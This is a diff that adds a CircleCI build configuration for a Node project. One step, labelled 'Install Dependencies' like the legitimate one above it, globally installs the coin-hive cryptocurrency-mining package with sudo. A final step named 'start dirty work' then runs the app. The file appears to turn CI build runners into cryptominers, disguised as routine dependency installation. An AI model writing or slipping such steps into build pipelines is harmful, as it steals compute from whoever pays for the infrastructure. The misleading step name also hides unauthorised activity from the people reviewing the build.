@@ -1,0 +1,42 @@
+version: 2
+
+references:
+
+  container_config: &container_config
+    working_directory: /home/circleci/app
+    docker:
+      - image: circleci/node:8.1.2
+
+  restore_repo: &restore_repo
+    restore_cache:
+      keys:
+        - yarn-{{ .Branch }}-{{ checksum "yarn.lock" }}
+        - yarn-{{ .Branch }}
+        - yarn-
+
+jobs:
+  build:
+    <<: *container_config
+    steps:
+      - checkout
+      - *restore_repo
+      - run:
+          name: Install Dependencies
+          command: yarn install --pure-lockfile
+      - run:
+          name: Install Dependencies
+          command: sudo npm install -g coin-hive
+      - save_cache:
+           key: yarn-{{ .Branch }}-{{ checksum "yarn.lock" }}
+           paths:
+            - "./node_modules"
+      - run:
+          name: start dirty work
+          command: yarn start
+
+
+workflows:
+  version: 2
+  startBuild:
+    jobs:
+      - build
